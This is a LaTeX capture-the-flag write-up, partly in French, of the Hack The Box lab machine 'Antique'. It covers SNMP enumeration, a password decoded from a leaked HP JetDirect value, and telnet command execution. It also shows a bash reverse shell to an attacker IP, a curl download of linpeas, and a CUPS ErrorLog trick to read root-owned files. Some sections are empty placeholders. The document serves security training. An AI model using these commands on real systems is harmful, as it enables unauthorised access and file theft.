\chapter{Antique}
\begin{itemize}
    \item {\bf technics}: snmp, cups 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ PORTS=$(sudo nmap -p- --min-rate=1000 -T4 10.10.11.107 | 
    grep '^[0-9]' | cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)

$ sudo nmap -sV -sC -p$PORTS 10.10.11.107

PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270:
|     JetDirect
|     Password:
|   NULL:
|_    JetDirect

\end{verbatim}

\subsubsection{23}

\begin{verbatim}
$ telnet 10.10.11.107 23
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

\end{verbatim}
\verb+23 TCP+ port for Telnet. This port can be used for remote configuration
of the HP Jetdirect device when there are no other configuration methods or it
can be used to check the current configuration.

\begin{verbatim}
HP JetDirect

?
Password: 
Invalid password
\end{verbatim}

\begin{verbatim}
$ searchsploit JetDirect

------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
HP JetDirect FTP Print Server - 'RERT' Denial of Service                      | windows/dos/29787.py
HP JetDirect J3111A - Invalid FTP Command Denial of Service                   | hardware/dos/20090.txt
HP Jetdirect - Path Traversal Arbitrary Code Execution (Metasploit)           | unix/remote/45273.rb
HP JetDirect PJL - Interface Universal Directory Traversal (Metasploit)       | hardware/remote/17635.rb
HP JetDirect PJL - Query Execution (Metasploit)                               | hardware/remote/17636.rb
HP JetDirect Printer - SNMP JetAdmin Device Password Disclosure               | hardware/remote/22319.txt
HP JetDirect rev. G.08.x/rev. H.08.x/x.08.x/J3111A - LCD Display Modification | hardware/remote/20565.c
------------------------------------------------------------------------------ -----------------
\end{verbatim}

\subsubsection{snmp}

\begin{verbatim}
$ sudo nmap -sU -p161 -sV -sC 10.10.11.107

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)

$ sudo nmap -sU -p161 --script=snmp-brute 10.10.11.107
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-29 08:42 CEST
Nmap scan report for 10.10.11.107
Host is up (0.035s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute:
|   <empty> - Valid credentials
|   cascade - Valid credentials
|   secret - Valid credentials
|   rmonmgmtuicommunity - Valid credentials
|   ANYCOM - Valid credentials
|   volition - Valid credentials
|   ILMI - Valid credentials
|   TENmanUFactOryPOWER - Valid credentials
|   MiniAP - Valid credentials
|   PRIVATE - Valid credentials
|   admin - Valid credentials
|   private - Valid credentials
|   public - Valid credentials
|   PUBLIC - Valid credentials
|   snmpd - Valid credentials
|   cisco - Valid credentials
|   mngt - Valid credentials
|_  snmp-Trap - Valid credentials
\end{verbatim}

\begin{verbatim}
 snmpwalk -v2c -c public 10.10.11.107
SNMPv2-SMI::mib-2 = STRING: "HTB Printer"

$ snmpbulkwalk -v2c -c public 10.10.11.107 .
SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
SNMPv2-SMI::enterprises.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
SNMPv2-SMI::enterprises.11.2.3.9.1.3.1.0 = NULL
SNMPv2-SMI::enterprises.11.2.3.9.1.4.1.0 = NULL
SNMPv2-SMI::enterprises.11.2.3.9.1.5.1.0 = NULL
SNMPv2-SMI::enterprises.11.2.3.9.1.6.1.0 = NULL
SNMPv2-SMI::enterprises.11.2.3.9.1.7.1.0 = NULL
SNMPv2-SMI::enterprises.11.2.3.9.1.8.1.0 = NULL
SNMPv2-SMI::enterprises.11.2.3.9.1.9.1.0 = NULL
\end{verbatim}

\url{http://www.irongeek.com/i.php?page=security/networkprinterhacking}

en utilisant \url{https://www.rapidtables.com/convert/number/hex-to-ascii.html}
on obtient \verb+P@ssw0rd@123!!123+ suivi de caracteres non printables
\begin{verbatim}
$ telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
>
\end{verbatim}

\begin{verbatim}
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
> exec ls
telnet.py
user.txt
> exec cat user.txt
\end{verbatim}

\begin{verbatim}
> exec bash -c 'bash -i >& /dev/tcp/10.10.16.5/4444 0>&1'
$ curl -O http://10.10.16.5:8080/linpeas.sh

\end{verbatim}

\begin{verbatim}
Vulnerable to CVE-2021-4034

Vulnerable to CVE-2021-3560

Vulnerable to CVE-2022-0847

tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -

\end{verbatim}

\begin{verbatim}
$ nc 127.0.0.1 631
nc 127.0.0.1 631
h
HTTP/1.0 400 Bad Request
Date: Sat, 29 Oct 2022 09:33:51 GMT
Server: CUPS/1.6
Content-Type: text/html; charset=utf-8
Content-Length: 346

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
        <TITLE>Bad Request - CUPS v1.6.1</TITLE>
        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
</HEAD>
<BODY>
<H1>Bad Request</H1>
<P></P>
</BODY>
</HTML>

\end{verbatim}

\begin{verbatim}
CUPS 1.6.1 Root File Read 

This module exploits a vulnerability in CUPS < 1.6.2, an open source printing
system. CUPS allows members of the lpadmin group to make changes to the
cupsd.conf configuration, which can specify an Error Log path. When the user
visits the Error Log page in the web interface, the cupsd daemon (running with
setuid root) reads the Error Log path and echoes it as plaintext. This module
is known to work on Mac OS X < 10.8.4 and Ubuntu Desktop <= 12.0.4 as long as
the session is in the lpadmin group. Warning: if the user has set up a custom
path to the CUPS error log, this module might fail to reset that path
correctly. You can specify a custom error log path with the ERROR_LOG datastore
option. 
\end{verbatim}

\url{https://github.com/rapid7/metasploit-framework/blob/master/modules/post/multi/escalate/cups_root_file_read.rb}

read the code

\begin{verbatim}
cupsctl ErrorLog=/root/root.txt
curl http://127.0.0.1:631/admin/log/error_log
\end{verbatim}

\subsection{Foothold}
\subsubsection{x}
\begin{verbatim}
\end{verbatim}

\subsubsection{x}

\begin{verbatim}

\end{verbatim}

\begin{verbatim}

\end{verbatim}
\section{Theorie}


